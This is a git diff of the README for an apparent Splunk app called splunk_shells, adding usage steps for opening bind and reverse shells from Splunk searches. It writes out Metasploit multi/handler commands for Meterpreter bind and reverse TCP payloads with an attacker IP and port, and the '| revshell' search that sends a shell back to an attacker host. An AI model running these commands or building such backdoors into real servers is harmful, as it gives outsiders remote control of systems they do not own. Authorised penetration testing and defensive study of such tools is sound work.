@@ -30,7 +30,15 @@ Once Splunk is restarted click on Permissions for the splunk_shells app. Ensure 
 ![Alt text](appserver/static/splunk_permissions.png?raw=true "Optional Title")
 
 # Usage
-using each of these shells can be done from the Search and Reporting app. Execute the following searches:
+Using each of these shells can be done from the Search and Reporting app. Setup a handler first then execute one of the following searches:
+
+## Bind Shell
+
+use multi/handler<br>
+set payload python/meterpreter_bind_tcp<br>
+set LHOST <ATTACKER IP><br>
+set LPORT <ATTCKER PORT><br>
+exploit -j<br>
 
 '| bindshell SHELLTYPE PORTNUMBER' 
 
@@ -39,8 +47,16 @@ SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)
 PORTNUMBER - Specify the port you want the bind shell to listen on. If you do not specify a port number it defaults to 8888
 
 
+## Reverse Shell
+
+use multi/handler<br>
+set payload python/meterpreter_reverse_tcp<br>
+set LHOST <ATTACKER IP><br>
+set LPORT <ATTCKER PORT><br>
+exploit -j<br>
+
 '| revshell SHELLTYPE ATTACKERIP ATTACKERPORT'
- 
+
 SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)
 
 ATTACKERIP - Specify the IP that you want to shell to be sent back to. 
